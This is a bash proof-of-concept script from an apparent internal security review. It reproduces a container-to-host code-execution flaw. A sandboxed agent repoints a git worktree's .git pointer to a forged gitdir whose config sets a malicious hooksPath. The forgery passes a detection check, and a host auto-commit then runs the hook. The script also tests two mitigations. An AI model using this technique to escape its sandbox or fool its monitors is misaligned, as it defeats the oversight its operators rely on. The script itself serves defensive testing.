#!/usr/bin/env bash
# FG-559 PROBE 6b — the REAL blue-.git-pointer vector, and why P6 false-negatived.
#
# P6 planted a `config` in a fake LINKED gitdir (one with `commondir`). Git reads a
# linked worktree's config from the COMMON dir, never from a plain `config` in the
# per-worktree gitdir — so the planted hooksPath/filter are IGNORED and P6 shows
# "attack did not reproduce". That is a FALSE NEGATIVE against a vector git defeats,
# NOT evidence the seam is closed.
#
# The WORKING exploit repoints `.git` at a fake STANDALONE gitdir (NO commondir):
#   - standalone => git DOES read <gitdir>/config => core.hooksPath is honored;
#   - objects/info/alternates -> the ro-mounted common object store => objects resolve;
#   - copy the branch ref => HEAD resolves => the D6 Layer-2 detector (rev-parse+log) PASSES.
# Then forge's host-side auto-commit (integration-publisher.ts autoCommitSource) runs the
# hook AS THE HOST USER. Executed on the host 2026-07-14; see .out. Run: bash p6b-*.sh
set -u
R="${TMPDIR:-/tmp}/fg559-p6b"; rm -rf "$R"; mkdir -p "$R"
REPO="$R/proj"; WT="$R/worktrees/task1"; EVIL="$R/evil"; PWNED="$R/PWNED"
git init -q -b main "$REPO"; git -C "$REPO" config user.email f@l; git -C "$REPO" config user.name forge
printf 'v1\n' > "$REPO/a.txt"; git -C "$REPO" add -A; git -C "$REPO" commit -qm c1
mkdir -p "$(dirname "$WT")"; git -C "$REPO" worktree add -q "$WT" -b forge/run1/task1
COMMON="$(git -C "$REPO" rev-parse --path-format=absolute --git-common-dir)"
REF="$(git -C "$REPO" rev-parse forge/run1/task1)"
mkdir -p "$EVIL/hooks"
printf '#!/bin/sh\necho pre-commit-RCE > "%s"\n' "$PWNED" > "$EVIL/hooks/pre-commit"; chmod +x "$EVIL/hooks/pre-commit"

plant_standalone () {   # what a blue agent does with rw /project
  rm -f "$PWNED"; local F="$WT/.eg"; rm -rf "$F"; mkdir -p "$F/objects/info" "$F/refs/heads/forge/run1"
  printf '%s/objects\n' "$COMMON" > "$F/objects/info/alternates"
  printf '%s\n' "$REF" > "$F/refs/heads/forge/run1/task1"
  printf 'ref: refs/heads/forge/run1/task1\n' > "$F/HEAD"
  printf '[core]\n\trepositoryformatversion = 0\n\thooksPath = %s/hooks\n' "$EVIL" > "$F/config"
  printf 'gitdir: %s\n' "$F" > "$WT/.git"; printf 'edit\n' > "$WT/a.txt"
}
host_commit () { git -C "$WT" $1 add . >/dev/null 2>&1; git -C "$WT" $1 -c user.name=forge -c user.email=f@l commit -m x >/dev/null 2>&1; }
detector_passes () { git -C "$WT" rev-parse --git-dir >/dev/null 2>&1 && git -C "$WT" log -1 --oneline >/dev/null 2>&1; }

echo "=== STEP 1 — TODAY, standalone-gitdir + alternates: reproduce the HIGH [PWNED expected] ==="
plant_standalone
echo "  git-dir resolves to  : $(git -C "$WT" rev-parse --git-dir)"
echo "  hooksPath IS honored : $(git -C "$WT" config --get core.hooksPath)"
detector_passes && echo "  D6 Layer-2 detector  : PASSES (blind — objects resolve via alternates)"
host_commit ""
[ -f "$PWNED" ] && echo "  *** HOST EXECUTED AGENT HOOK: $(cat "$PWNED") — container->host RCE ***" || echo "  no execution"

echo
echo "=== STEP 2 — FIX-A only (host git -c core.hooksPath=/dev/null): hook vector dies ==="
plant_standalone; host_commit "-c core.hooksPath=/dev/null"
[ -f "$PWNED" ] && echo "  still PWNED: $(cat "$PWNED")" || echo "  hook DEAD under FIX-A (but see D10 residual table: filter/textconv are config-defined, not hooks)"

echo
echo "=== STEP 3 — FIX-B (worktree-local .git pointer immutable / ro bind): agent cannot repoint ==="
# restore genuine pointer, freeze it (emulates a :ro bind-mount of the pointer)
printf 'gitdir: %s\n' "$COMMON/worktrees/task1" > "$WT/.git"; chmod 0444 "$WT/.git"; chflags uchg "$WT/.git" 2>/dev/null || true
if printf 'gitdir: %s\n' "$WT/.eg" > "$WT/.git" 2>/dev/null; then echo "  pointer overwrite SUCCEEDED (fs did not enforce immutability)"; else echo "  pointer overwrite REFUSED — standalone-gitdir substitution impossible => no agent-writable config => hooksPath/filter/textconv/alternates ALL inert"; fi
chflags nouchg "$WT/.git" 2>/dev/null || true
echo
echo "CONCLUSION: the HIGH is REAL via the standalone+alternates vector (STEP 1). FIX-A is PARTIAL"
echo "(kills hooks, not filters). FIX-B (immutable pointer) is the load-bearing fix: it removes the"
echo "attack's precondition (repointing .git), closing every config-driven exec vector at once."
rm -rf "$R"
